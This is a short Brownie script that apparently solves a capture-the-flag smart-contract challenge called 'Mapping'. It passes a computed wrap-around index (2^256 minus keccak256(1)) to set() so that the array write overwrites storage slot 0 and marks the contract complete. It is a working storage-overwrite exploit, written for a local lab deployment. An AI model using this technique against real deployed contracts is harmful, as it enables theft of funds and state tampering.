from brownie import MappingChallenge, accounts, web3


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = MappingChallenge.deploy({'from': deployer})

    contract.set(2**256 - int(web3.soliditySha3(
        abi_types=['uint256'], values=[1]).hex()[2:], 16), 0x01, {'from': player})

    assert contract.isComplete() == True
